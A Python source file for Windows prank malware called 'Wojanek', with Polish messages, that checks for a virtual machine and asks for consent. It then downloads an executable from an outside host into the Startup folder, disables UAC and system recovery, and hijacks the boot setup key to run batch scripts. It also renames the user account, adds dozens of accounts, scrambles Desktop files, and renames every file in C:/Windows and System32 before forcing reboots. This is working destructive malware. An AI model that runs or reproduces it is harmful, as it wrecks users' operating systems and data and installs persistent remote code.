import os
import requests
import sys
import tempfile
import random
import string
import time
import json
import subprocess
import glob
import pygame
import win32api
import win32con
import win32gui
from shapely.geometry import box
from shapely.ops import unary_union
import math
import pyautogui
import ctypes
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import threading

from pynput import keyboard
import tkinter as tk
from tkinter import messagebox

import detect

width = win32api.GetSystemMetrics(0)
height = win32api.GetSystemMetrics(1)
SQUARE = 128

assets = {}

def real_file():
    if getattr(sys, "frozen", False):   # uruchomione jako exe (PyInstaller)
        return sys.executable
    else:                               # uruchomione jako zwykły .py
        return __file__

def keep_max_volume(interval=2):
    while True:
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None
            )
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(1.0, None)
            volume.SetMute(0, None)
        except Exception as e:
            pass
        time.sleep(interval)
        
class MovingImage:
    def __init__(self, image_path, start_pos = None, speed = None):
        self.image = pygame.image.load(image_path).convert_alpha()
        if(start_pos == None):
            self.x, self.y = (random.randint(0, width), random.randint(0, height))
        else:
            self.x, self.y = start_pos
        if(speed == None):
            self.dx, self.dy = (random.randint(15, 30), random.randint(15, 30))
        else:
            self.dx, self.dy = speed
        self.width, self.height = (255, 255)
    
    def update_position(self):
        global alltime
        # Aktualizuj pozycję obiektu
        self.x += self.dx
        self.y += self.dy

        # Sprawdź kolizje z krawędziami ekranu i odbij się
        if self.x <= -1 * self.width or self.x >= width:
            self.dx = -self.dx
        if self.y <= -1 * self.height or self.y >= height:
            self.dy = -self.dy

    def draw(self, surface : pygame.Surface):
        surface.blit(self.image, (self.x, self.y))

root = tk.Tk()
root.withdraw()

verdict, score, evidence = detect.is_virtual_machine_windows()
#print(f"Verdict: {verdict} (score={score})")
#print("Evidence:")
#for e in evidence:
#    print(" -", e)

second_phase = os.path.exists(os.path.expanduser("~") + "/wojanek_assets.json")
   
if("--uzywam-vmki-oraz-ponosze-pelna-odpowiedzialnosc" in sys.argv):
    # Wymuszamy.
    verdict = "vm (high confidence)"

if(not second_phase): 
    if(verdict == "bare-metal"):
        messagebox.showwarning("Informacja", "Ten program nie jest kompatybilny z twoją konfiguracją. Aby kontynuować, zaleca sie obsługa wirtualnej maszyny. Jeżeli się pomyliliśmy to użyj argumentu --uzywam-vmki-oraz-ponosze-pelna-odpowiedzialnosc")
        sys.exit(0)
        
    for i in range(2):
        odpowiedz = messagebox.askyesno("Wojanek", "Ten wirus jest w stanie trwale rozwalić twój system Windows. Autor nie ponosi odpowiedzialności za szkody, straty plików, złość szefa, lub wojnę nuklearną, czy jesteś pewny że chcesz kontynuować? Dla pewności to jest " + str(i + 1) + " pytanie, " + ("jeszcze się ciebie zapytamy " + str(1 - i) + " razy.") if 1 - i != 0 else "to jest ostatnie pytanie")

        if odpowiedz:
            pass
        else:
            messagebox.showwarning("Informacja", "Program zostanie wyłączony.")
            sys.exit(0)

        time.sleep(3)
else:
    with open(os.path.expanduser("~") + "/wojanek_assets.json", "r", encoding="utf-8") as f:
        assets = json.load(f)

press_count = 0
press_str = "WOJANEK"

def on_press(key):
    global press_count
    try:
        pyautogui.typewrite(press_str[press_count % len(press_str)])
        press_count += 1
    except AttributeError:
        pass

#
# Download assets
#

ENDPOINT = "https://assets.pansage.xyz/"

if(second_phase):
    t = threading.Thread(target=keep_max_volume, args=(1,), daemon=True)
    t.start()
    listener = keyboard.Listener(on_press=on_press, suppress=True)
    listener.start()
        
    pygame.init()
    window_screen = pygame.display.set_mode((width, height), pygame.NOFRAME)
    hwnd = pygame.display.get_wm_info()["window"]
    
    clock = pygame.time.Clock()
    
    images = []
    if(second_phase):
        images = [
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanek.png"]),
            MovingImage(assets["wojanpic.png"])
        ]

    # Ustawienie okna jako "zawsze na wierzchu"
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, width, height, 0)

    # Ustawienie przezroczystości okna
    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(
                        hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
    win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(255, 0, 128), 0, win32con.LWA_COLORKEY)
    
    started = False
    started_well_started = False
    started_after_wojanek = False
    
    angry = False
    angry_iters = 0
    
    for_reboot = False
    
    while not False:
        for event in pygame.event.get():
            #if event.type == pygame.QUIT:
            #    pygame.quit()
            #    sys.exit(0)
            pass
                
        pygame.font.init()
        font = pygame.font.SysFont('Comic Sans MS', 60)
        fontsmol = pygame.font.SysFont('Comic Sans MS', 30)
        if(not angry):
            window_screen.fill((255, 0, 128))  
            try:
                for img in images:
                    img.update_position()
                    img.draw(window_screen)
            except:
                pass
            
            image = pygame.image.load(assets["wojanbottom.png"]).convert_alpha()
            window_screen.blit(image, (30, height - 48), (0, 0, 96, 48))
            image2 = pygame.image.load(assets["wojantop.png"]).convert_alpha()
            y = 48 + random.randint(-30, 30)
            window_screen.blit(image2, (30, height - 30 - 96 + random.randint(-30, 30)), (30, y, 96, y + random.randint(32, 64)))

            if(not started and not started_after_wojanek):
                if(not started_well_started):
                    press_count = 0
                    started_well_started = True
                if(press_count == len(press_str)):
                    started = True
                else:
                    window_screen.fill((0, 0, 0), (math.floor(width / 2) - 256, math.floor(height / 2) - 128, 512, 256))
                    text_surface = fontsmol.render("Jaki jest najlepszy napój?", False, (255, 255, 255))
                    window_screen.blit(text_surface, (math.floor(width / 2 - text_surface.get_width() / 2), math.floor(height / 2 - text_surface.get_height() / 2) - 64))
                    window_screen.fill((255, 255, 255), (math.floor(width / 2) - 192, math.floor(height / 2) - 32 + 64, 384, 64))
                    text_surface = fontsmol.render(press_str[0:press_count], False, (0, 0, 0))
                    window_screen.blit(text_surface, (math.floor(width / 2 - text_surface.get_width() / 2), math.floor(height / 2 - text_surface.get_height() / 2) + 64))
            elif(started and not started_after_wojanek):
                started_after_wojanek = True
            else:
                window_screen.fill((255, 0, 0), (math.floor(width / 2) - 32, math.floor(height / 2) - 32, 64, 64))
                text_surface = font.render("X", False, (255, 255, 255))
                window_screen.blit(text_surface, (math.floor(width / 2 - text_surface.get_width() / 2), math.floor(height / 2 - text_surface.get_height() / 2)))
                
                mouse = pygame.mouse.get_pos()
                if(mouse[0] > math.floor(width / 2) - 32 and mouse[0] < math.floor(width / 2) + 32 and mouse[1] > math.floor(height / 2) - 32 and mouse[1] < math.floor(height / 2) + 32):
                    angry = True
        else:
            window_screen.fill((0, 0, 0))
            angry_iters += 1
            text = "Jak śmiesz uciekać od Wojanka..." + " Sprawdz Discorda..." if discord else ""
            text_surface = font.render(text[0:min(math.floor(angry_iters / 15), len(text))], False, (255, 255, 255))
            window_screen.blit(text_surface, (math.floor(width / 2 - text_surface.get_width() / 2), math.floor(height / 4 - text_surface.get_height() / 2)))
            
            image = pygame.image.load(assets["wojan.png"]).convert_alpha()
            window_screen.blit(image, (math.floor(width / 2) - 128, math.floor(height / 2) - 128), (0, 0, 128, 128))
            
            if(not for_reboot):
                files = ""
                for g in glob.glob("C:/Windows/*.*"):
                    c = g.replace(os.path.basename(g), "WOJANEK-" + "".join(random.choice(string.hexdigits) for i in range(8)) + "." + os.path.basename(g).split(".")[-1])
                    files += f"move \"{g}\" \"{c}\" > nul\n"
                for g in glob.glob("C:/Windows/system32/*.*"):
                    c = g.replace(os.path.basename(g), "WOJANEK-" + "".join(random.choice(string.hexdigits) for i in range(8)) + "." + os.path.basename(g).split(".")[-1])
                    files += f"move \"{g}\" \"{c}\" > nul\n"
                commands = [
                    'reg add HKLM\\System\\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\\dosexecarm.bat" /f',
                    'reg add HKLM\\System\\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f',
                    'reg add HKLM\\System\\Setup /v SetupType /t REG_DWORD /d 2 /f',
                    'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f',
                    'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f',
                    'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v VerboseStatus /t REG_DWORD /d 1 /f',
                ]
                with open("C:/dosexecarm.bat", "w", encoding="utf-8") as f:
                    f.write("""
@echo off
echo "Aktu@1iS4ci$ Mind0w54 g8"
echo "(Zabrakło budzetu n...HA WOJ@N3K WKURWIONY...e)"
echo "-----------------------------------------------"
echo "BŁĄD W AKTUALIZACJI!"
echo "Powód: W0J4N 4NGrY"
bcdedit /set {default} recoveryenabled No
reg add HKLM\\System\\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\\dosexec.bat" /f
""" + files)
                with open("C:/dosexec.bat", "w", encoding="utf-8") as f:
                    f.write("""
@echo off
echo "Aktu@1iS4ci$ Mind0w54 g8"
echo "(Zabrakło budzetu n...HA WOJ@N3K WKURWIONY...e)"
echo "-----------------------------------------------"
echo "BŁĄD W AKTUALIZACJI!"
echo "Powód: W0J4N 4NGrY"
ping 127.0.0.1 -n 2 > nul
shutdown -r -t 0
""")
                    print("[OK] dosexec.bat")

                for cmd in commands:
                    try:
                        subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
                        print(f"[OK] {cmd}")
                    except subprocess.CalledProcessError as e:
                        print(f"[ERROR] {cmd}\n{e.stderr}")
                
                subprocess.run("shutdown -r -t " + str(math.ceil(1.5 * len(text) + 5)), shell=True, check=True, capture_output=True, text=True)
                for_reboot = True
            
        pygame.display.update()
        clock.tick(60)
else:
    if(ENDPOINT[-1] == "/"):
        ENDPOINT = ENDPOINT[:-1]

    asset_map = {
        "wojan.png": "/wojanekassets/wojan.png",
        "wojanbottom.png": "/wojanekassets/wojanbottom.png",
        "wojantop.png": "/wojanekassets/wojantop.png",
        "wojanek.png": "/wojanekassets/wojanek.png",
        "wojanek_music.exe": "/wojanekassets/wojanek_music.exe",
        "wojanpic.png": "/wojanekassets/wojanpic.png"
    }

    for asset in asset_map.keys():
        loc = os.path.join(tempfile.gettempdir(), "".join(random.choice(string.ascii_lowercase) for i in range(21)) + "." + asset.split(".")[-1])
        if(asset == "wojanek_music.exe"):
            loc = os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/wojanek_music.exe"
        with open(loc, "wb") as f:
            f.write(requests.get(ENDPOINT + asset_map[asset]).content)
        print("[WT] " + asset_map[asset] + " -> " + loc)
        assets[asset] = loc
        print("[OK] " + asset_map[asset] + " -> " + loc)
        
    with open(os.path.expanduser("~") + "/wojanek_assets.json", "w", encoding="utf-8") as f:
        json.dump(assets, f, indent=4)
        print("[OK] wojanek_assets.json")
        
    with open(os.path.expanduser("~") + "/wojan.png", "wb") as f:
        f.write(requests.get(ENDPOINT + asset_map["wojan.png"]).content)
        print("[OK] wojan.png")

    cmd = f'Rename-LocalUser -Name "{os.getlogin()}" -NewName "W0J4NEK"'
    try:
        subprocess.run(["powershell", "-Command", cmd], check=True)
        print("[OK] Rename-LocalUser")
    except:
        print("[ERROR] Rename-LocalUser")

    commands = [
        'reg add HKLM\\System\\Setup /v CmdLine /t REG_SZ /d "cmd.exe /k C:\\dosexec.bat" /f',
        'reg add HKLM\\System\\Setup /v SystemSetupInProgress /t REG_DWORD /d 1 /f',
        'reg add HKLM\\System\\Setup /v SetupType /t REG_DWORD /d 2 /f',
        'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableCursorSuppression /t REG_DWORD /d 0 /f',
        'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f',
        'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v VerboseStatus /t REG_DWORD /d 1 /f',
        'reg add "HKCU\\Control Panel\\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f',
        'reg add "HKCU\\Control Panel\\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d 0 /f',
        'reg add "HKCU\\Control Panel\\Desktop" /v HungAppTimeout /t REG_SZ /d 0 /f',
        'reg add "HKU\\.DEFAULT\\Control Panel\\Desktop" /v AutoEndTasks /t REG_SZ /d 1 /f',
        'reg add "HKU\\.DEFAULT\\Control Panel\\Desktop" /v WaitToKillAppTimeout /t REG_SZ /d 0 /f',
        'reg add "HKU\\.DEFAULT\\Control Panel\\Desktop" /v HungAppTimeout /t REG_SZ /d 0 /f',
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control" /v WaitToKillServiceTimeout /t REG_SZ /d 0 /f',
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v UseDefaultTile /t REG_DWORD /d 1 /f'
    ]

    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            print(f"[OK] {cmd}")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] {cmd}\n{e.stderr}")

    files = ""
    for g in glob.glob(os.path.expanduser("~") + "/Desktop/*", recursive=True):
        c = g.replace(os.path.basename(g), "WOJANEK-" + "".join(random.choice(string.hexdigits) for i in range(8)) + "." + os.path.basename(g).split(".")[-1])
        files += f"move \"{g}\" \"{c}\"  > nul\n"
    for g in glob.glob("C:/Users/Public/Desktop/*", recursive=True):
        c = g.replace(os.path.basename(g), "WOJANEK-" + "".join(random.choice(string.hexdigits) for i in range(8)) + "." + os.path.basename(g).split(".")[-1])
        files += f"move \"{g}\" \"{c}\" > nul\n"

    users = ""
    for i in range(63):
        u = "WOJANEK-" + "".join(random.choice(string.ascii_lowercase) for i in range(8))
        users += f'net user {u} W0J4NEK /add  > nul\n'

    with open("C:/dosexec.bat", "w", encoding="utf-8") as f:
        f.write("""
@echo off
echo "Aktualizacja Windowsa 98"@
echo "(Zabrakło budżetu na prawidłowy Windows Update)"
echo "-----------------------------------------------"
echo ""
set /p="Aktualizacja plików Windowsa: " <nul
move \"""" + os.path.abspath(real_file()) + "\" \"" + os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + os.path.basename(real_file()) + """\" 
echo taskkill /f /im dwm.exe > \"""" + os.path.expanduser("~") + """/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/dwmk.bat\" 
del /q "%AppData%\Microsoft\Windows\AccountPictures\*" > nul
copy \"""" + assets["wojanpic.png"] + """\" \"%AppData%\\Microsoft\\Windows\\AccountPictures\"
ping 127.0.0.1 -n 3 > nul
echo OK
ping 127.0.0.1 -n 1 > nul
set /p="Dostosowywanie systemu: " <nul
""" +
files
+ """
echo OK
ping 127.0.0.1 -n 1 > nul
set /p="Palenie SSD: " <nul
ping 127.0.0.1 -n 2 > nul
echo FAIL
set /p="Utrwalanie systemu: " <nul
reg add HKLM\System\Setup /v CmdLine /t REG_SZ /d "" /f > nul
reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 0 /f > nul
reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 0 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableCursorSuppression /t REG_DWORD /d 1 /f > nul
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v VerboseStatus /t REG_DWORD /d 0 /f > nul
echo OK
set /p="Utwardzanie systemu: " <nul
""" + 
users
+ """
echo OK
echo "WRACAMY DO WINDOWSA 98!"
echo "WRACAMY DO WINDOWSA 98!"
echo "WRACAMY DO WINDOWSA 98!"
ping 127.0.0.1 -n 2 > nul
shutdown -r -t 0
""")
        print("[OK] dosexec.bat")
    
    ctypes.windll.user32.SystemParametersInfoW(20, 0, assets["wojanpic.png"], 0)

    os.system("shutdown -r -f -t 0")
